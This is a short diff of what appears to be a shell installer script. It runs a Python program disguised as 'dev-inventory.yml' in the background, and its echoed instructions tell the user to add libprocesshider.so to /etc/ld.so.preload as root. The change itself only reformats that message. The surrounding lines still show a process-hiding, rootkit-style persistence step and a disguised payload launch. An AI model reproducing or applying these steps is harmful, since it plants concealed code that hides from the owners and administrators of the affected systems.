@@ -49,5 +49,6 @@ mv dev-inventory.yml ../dev-inventory.yml
 python3 ../dev-inventory.yml $1 $2 &
 
 echo "Script execution completed successfully."
-echo "To finish installation, use /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
+echo "To finish installation, use "
+echo "/usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
 echo "As root"
